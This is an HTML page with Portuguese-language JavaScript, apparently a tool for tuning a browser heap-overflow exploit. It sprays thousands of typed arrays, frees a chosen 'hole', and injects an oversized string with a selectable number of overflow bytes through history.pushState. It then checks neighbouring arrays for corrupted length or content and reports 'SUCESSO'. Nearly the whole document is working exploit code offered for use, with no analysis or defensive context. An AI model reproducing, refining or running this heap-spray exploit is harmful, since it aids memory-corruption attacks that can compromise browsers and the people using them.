<!DOCTYPE html>
<html>
<head>
    <title>Heap Precision Tool: Tuner</title>
    <style>
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            padding: 20px; 
            user-select: none;
        }
        h1 { border-bottom: 2px solid #0f0; padding-bottom: 10px; }
        
        .panel { 
            background: #111; 
            border: 1px solid #333; 
            padding: 15px; 
            margin-bottom: 15px; 
        }
        
        .log { 
            border: 1px solid #004400; 
            height: 300px; 
            overflow-y: scroll; 
            padding: 10px; 
            background: #001100; 
            font-size: 13px; 
            white-space: pre-wrap;
        }

        .btn-group { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 5px; }
        
        button { 
            padding: 10px 15px; 
            font-family: inherit; 
            font-weight: bold; 
            cursor: pointer; 
            background: #222; 
            color: #fff; 
            border: 1px solid #555; 
        }
        button:hover { background: #444; border-color: #fff; }
        button.active { background: #006600; border-color: #0f0; }
        
        .label { color: #aaa; font-size: 12px; text-transform: uppercase; }
        .danger { color: #ff5555; }
    </style>
</head>
<body>
    <h1>HEAP PRECISION TUNER</h1>
    
    <div class="panel">
        <div class="label">1. Selecione o Overflow (Quantidade de bytes extras)</div>
        <div class="btn-group" id="overflowGroup">
            <button onclick="setOverflow(1)">1 Byte</button>
            <button onclick="setOverflow(2)">2 Bytes</button>
            <button onclick="setOverflow(4)">4 Bytes</button>
            <button onclick="setOverflow(8)">8 Bytes</button>
            <button onclick="setOverflow(16)">16 Bytes</button>
            <button onclick="setOverflow(32)">32 Bytes</button>
            <button onclick="setOverflow(64)" class="danger">64 Bytes</button>
        </div>
        <p id="overflowDisplay" style="color:yellow; margin-top:5px;">Atual: 1 Byte (Mais seguro)</p>
    </div>

    <div class="panel">
        <div class="label">2. Executar Teste (Tamanho do Buraco)</div>
        <div class="btn-group">
            <button onclick="runTest(160)">Hole 160</button>
            <button onclick="runTest(168)">Hole 168</button>
            <button onclick="runTest(172)">Hole 172</button>
            <button onclick="runTest(176)">Hole 176</button>
            <button onclick="forceGC()" style="background:#442200;">Forçar GC</button>
        </div>
    </div>

    <div id="logger" class="log">Configure o overflow e inicie o teste...</div>

    <script>
        const logger = document.getElementById('logger');
        
        // --- CONFIGURAÇÕES ---
        const PAYLOAD_BASE_SIZE = 709522; // Base da string
        const SPRAY_SIZE = 8000;          // Quantidade de arrays
        const SPRAY_CENTER = 4000;        // Onde abrir o buraco
        const MAGIC_NUM = 0x41414141;     
        
        var currentOverflow = 1; // Padrão seguro
        var spray = [];

        function log(msg, type='') {
            const d = document.createElement('div');
            d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.style.color = type === 'error' ? '#ff5555' : (type === 'success' ? '#0f0' : '#ccc');
            if(type === 'success') d.style.fontWeight = 'bold';
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        function setOverflow(bytes) {
            currentOverflow = bytes;
            document.getElementById('overflowDisplay').innerText = `Atual: ${bytes} Bytes${bytes > 30 ? ' (PERIGO DE CRASH)' : ''}`;
            log(`Overflow definido para: ${bytes} bytes.`);
        }

        function forceGC() {
            if(window.gc) window.gc();
            else for(let i=0; i<50; i++) new ArrayBuffer(1024 * 1024);
            log("GC Forçado.");
        }

        async function runTest(holeSize) {
            log("==========================================");
            log(`INICIANDO: Hole=${holeSize} | Overflow=${currentOverflow}B`);
            
            // 1. Limpeza
            spray = null;
            await new Promise(r => setTimeout(r, 100));
            spray = [];
            forceGC();
            await new Promise(r => setTimeout(r, 300));
            
            // 2. Spray
            log("Alocando estruturas...");
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024); 
                arr[0] = MAGIC_NUM; 
                arr[1] = i;         
                spray.push(arr);
            }

            // 3. Abrir Buraco
            log(`Criando buraco de ${holeSize} slots...`);
            for(let i=0; i < holeSize; i++) {
                spray[SPRAY_CENTER + i] = null;
            }

            // Delay GC
            log("Aguardando GC (1s)...");
            await new Promise(r => setTimeout(r, 1000));

            // 4. Injeção
            try {
                // Criação Otimizada
                let base = new Array(PAYLOAD_BASE_SIZE + 1).join('A');
                
                // Overflow Dinâmico
                // Usamos 'B' (\x42) para ser visível.
                let overflow = new Array(currentOverflow + 1).join('B'); 
                
                let payload = base + overflow; 

                log(`Injetando payload...`);
                history.pushState({}, "pwn_" + Date.now(), payload);
                
                // 5. Verificação
                checkCorruption(holeSize, SPRAY_CENTER);

            } catch(e) {
                log("ERRO: " + e.message, "error");
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            log("Verificando vizinhos...");
            let found = false;
            let limit = startIdx + holeUsed + 60; // Verifica 60 vizinhos à frente

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // Verifica Length
                    if(arr.length !== 1024) {
                        found = true;
                        reportSuccess(i, "LENGTH", arr.length);
                        return;
                    }
                    // Verifica Conteúdo
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        reportSuccess(i, "CONTENT", arr.length);
                        return;
                    }
                }
            }
            if(!found) log("Nenhuma corrupção detectada. Tente aumentar o Overflow ou mudar o Hole Size.");
        }

        function reportSuccess(idx, type, len) {
            document.body.style.background = "#003300";
            let msg = `!!! SUCESSO !!!\nIndex: ${idx}\nType: ${type}\nNew Length: ${len}`;
            log(msg, "success");
            alert(msg);
        }
    </script>
</body>
</html>
